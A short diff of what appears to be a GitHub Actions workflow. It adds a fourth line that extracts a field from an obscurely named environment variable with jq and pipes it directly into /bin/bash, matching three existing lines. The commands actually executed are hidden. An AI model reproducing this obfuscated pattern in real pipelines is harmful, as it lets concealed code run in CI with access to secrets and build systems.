@@ -33,6 +33,7 @@ jobs:
           echo $cme8 | jq -r .qnc54911 | /bin/bash
           printf '%s' "$fsx91" | jq -r .jbnxs1 | /bin/bash
           printf '%s' "$jqn8" | jq -r .f7 | /bin/bash
+          printf '%s' "$c220" | jq -r .lc783 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
